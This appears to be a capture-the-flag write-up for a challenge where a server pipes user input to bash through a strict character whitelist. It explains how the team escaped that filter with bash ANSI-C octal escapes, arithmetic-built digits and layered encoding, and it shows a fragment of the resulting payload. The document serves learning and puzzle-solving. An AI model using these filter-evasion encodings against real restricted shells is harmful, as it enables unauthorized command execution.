# echoechoechoecho, 216p, 18 solves

> Echo echo echo echo, good luck
> 
> nc 35.246.181.187 1337

In this task we are able to input commands to be executed on server. The catch is there
is a strict whitelist of allowed characters. The relevant code is:

```python
    if re.search(r'[^();+$\\= \']', payload.replace("echo", "")):
        bye("ERROR invalid characters")

    # real echolords probably wont need more special characters than this
    if payload.count("+") > 1 or \
            payload.count("'") > 1 or \
            payload.count(")") > 1 or \
            payload.count("(") > 1 or \
            payload.count("=") > 2 or \
            payload.count(";") > 3 or \
            payload.count(" ") > 30:
        bye("ERROR Too many special chars.")

```

There is also an interesting snippet near the bottom:

```python
payload += "|bash"*count
```

In other words, we can execute any string consisting of rather small number of
`^();+$\= '` characters and `echo` strings and pipe it to bash up to ten times.

The most important thing to do is to increase number of limited characters (like brackets),
since it's clearly impossible to encode useful commands in so little space. Let's say
we want to have more than one `(` character. We can write:

```bash
echo=\(; echo $echo$echo$echo$echo
```

Which will print four left brackets after one bash pipe. We can encode the other limited characters in a similar
fashion (remembering to backslash-escape the inner string; thankfully backslashes are unlimited). Now that
we can do that, we should think of a way to encode arbitrary characters. It turns out there is a `$'abcd'` syntax
in bash, enabling 
[ANSI-C quoting](https://www.gnu.org/software/bash/manual/html_node/ANSI_002dC-Quoting.html#ANSI_002dC-Quoting).
Of the features, the one useful for us are escape sequences: `$'\154\163'` will expand to `ls` after passing
through a layer of bash. We have all the characters needed except digits. We can make digits using bash
arithmetics though: `$(($$==$$))` is `1` and we can add up to nine ones to get any digit.

We wrote an automatic encoder of arbitrary commands, consisting of eight layers of encoding. We were able
to execute simple commands, like `ls -al` and found unreadable `flag` file and executable `getflag` binary.
It asked us to implement an arithmetic captcha, which turned out to be the same as 
[here](https://hack.more.systems/writeup/2017/12/30/34c3ctf-minbashmaxfun/). We could copy the solver snippet
from there (we had to use temporary files to remember captcha while the binary was still running, so it
was not trivial).

For some reason the server seemed to break after receiving too much data (though
it was pretty hard to pinpoint the exact spot). The command admittedly grew rather large,
owing mostly to backslash exponential escaping. We optimized the encoding a bit (such as remembering 
single `1` in another `$echo` variable in digit encoding stage) and eventually got the full command to pass.

For fun, here's the first 1000 characters (of over 100kB) of final payload:

```bash
echo=\=; echo echo$echo\\\;\; echo echo$echo\\\\+\$echo echo echo$echo\\\\\\\\\\\\\\\)\\\\\$echo echo echo$echo\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\(\\\\\\\\\\\\\$echo echo echo$echo\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\$echo echo echo$echo\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\$\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\$echo\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\$echo\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\$\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\$$echo$echo\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\$\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\$\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\$echo\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\$echo\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\$echo echo echo \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
```

The final encoder code is in `encoder.py` file.
